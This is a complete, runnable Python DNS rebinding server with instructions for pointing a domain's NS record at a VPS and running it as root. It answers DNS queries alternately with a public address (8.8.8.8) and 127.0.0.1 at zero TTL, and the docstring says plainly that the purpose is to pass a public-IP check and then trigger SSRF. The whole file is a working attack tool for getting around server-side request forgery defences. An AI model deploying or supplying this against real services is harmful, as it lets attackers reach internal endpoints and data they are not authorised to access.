#!/usr/bin/env python3
"""
DNS Rebinding Server - Run on VPS
==================================
Point NS record for ssrf.werz.xyz to your VPS IP.
Then run: sudo python3 vps_dns_server.py

This returns alternating IPs:
  Query 1: 8.8.8.8 (public - passes check)
  Query 2: 127.0.0.1 (private - SSRF!)
"""

import socket
import struct
from collections import defaultdict

PUBLIC_IP = "8.8.8.8"
PRIVATE_IP = "127.0.0.1"
DNS_PORT = 53  # Needs sudo

query_count = defaultdict(int)

def ip_to_bytes(ip):
    return bytes(int(x) for x in ip.split('.'))

def build_response(query, ip):
    response = query[:2]
    response += struct.pack(">H", 0x8180)
    response += struct.pack(">HHHH", 1, 1, 0, 0)
    
    q_end = 12
    while query[q_end] != 0:
        q_end += 1
    q_end += 5
    response += query[12:q_end]
    
    response += struct.pack(">H", 0xc00c)
    response += struct.pack(">HH", 1, 1)
    response += struct.pack(">I", 0)  # TTL = 0
    response += struct.pack(">H", 4)
    response += ip_to_bytes(ip)
    
    return response

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', DNS_PORT))
    
    print("=" * 50)
    print(" DNS Rebinding Server (port 53)")
    print("=" * 50)
    print(f"Query 1: {PUBLIC_IP} | Query 2: {PRIVATE_IP}")
    print("=" * 50)
    
    while True:
        data, addr = sock.recvfrom(512)
        query_count[addr[0]] += 1
        count = query_count[addr[0]]
        
        ip = PUBLIC_IP if count % 2 == 1 else PRIVATE_IP
        print(f"Query #{count} from {addr[0]} -> {ip}")
        
        sock.sendto(build_response(data, ip), addr)

if __name__ == "__main__":
    main()
